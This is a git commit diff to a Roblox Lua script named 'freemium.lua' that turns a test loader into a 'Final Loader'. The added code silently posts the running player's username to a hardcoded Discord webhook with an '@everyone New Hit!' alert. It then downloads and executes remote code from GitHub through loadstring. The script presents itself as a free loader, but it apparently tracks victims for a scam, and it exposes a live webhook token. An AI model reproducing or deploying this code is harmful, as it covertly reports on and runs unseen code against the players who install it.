63018c545c6ba27f65aa722a84644b1f29e38163
BaddiesScripted <likinggangfr3@gmail.com>
2026-04-19 01:40:24 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,5 +1,22 @@
--- Super Simple Test Loader
+-- Final Loader (GUI + Discord Ping)
 
-print("Loader started - testing gui.lua")
+_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
+_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- ← Change this to your real Roblox usernames
+
+_G.PING_POOR = true
+
+-- Send Discord ping
+task.spawn(function()
+    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
+        local http = game:GetService("HttpService")
+        local plr = game.Players.LocalPlayer
+        local message = "@everyone New Hit! Username: " .. plr.Name
+        game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = message}))
+    end
+end)
+
+-- Load the GUI
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
+end)
